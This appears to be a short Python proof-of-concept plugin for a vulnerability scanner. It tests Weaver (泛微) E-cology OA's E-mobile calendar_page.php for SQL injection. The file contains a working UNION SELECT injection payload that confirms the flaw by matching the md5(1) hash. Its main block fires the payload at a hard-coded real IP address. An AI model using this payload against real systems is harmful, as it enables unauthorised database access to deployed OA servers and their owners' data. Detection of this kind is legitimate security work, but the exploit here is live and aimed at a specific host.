#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:泛微oa E-cology sql报错注入 
#Refer: http://www.wooyun.org/bugs/wooyun-2010-0127270
#Data:2015/12/19



def assign(service,arg):
    if service=="weaver_oa":
        return True,arg

def  audit(arg):
    payload=arg+"E-mobile/calendar_page.php?detailid=-5272%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2Cmd5%281%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--"
    code,head,res,errcode,finalurl=curl.curl2(payload)
    if code==200 and "c4ca4238a0b923820dcc509a6f75849b"  in res:
        security_hole("sql inject"+payload)
        
if __name__=="__main__":
    from dummy import *
    audit(assign("weaver_oa","http://219.232.254.131:8082/")[1])